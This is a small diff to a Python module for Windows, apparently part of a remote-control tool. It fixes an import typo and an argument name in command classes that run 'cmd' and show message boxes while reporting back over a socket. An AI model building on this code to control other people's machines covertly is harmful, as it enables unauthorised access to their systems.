@@ -1,4 +1,4 @@
-simport subprocess,win32api,ctypes,getpass,sock
+import subprocess,win32api,ctypes,getpass,sock
 class cmd:
     def __init__(self):
         self.command = 'cmd'
@@ -27,7 +27,7 @@ class messagebox:
         self.command = 'messagebox'
         self.description = 'generating a custom messagebox with: messagebox <message> <window title>\n'
         self.args = True
-    def main(self,arg):
+    def main(self,args):
         Box = ctypes.windll.user32.MessageBoxA
         sock.sock.s.send("Box was opened\n")
         Box(None,args.split(" ")[0],args.split(" ")[1], 0)
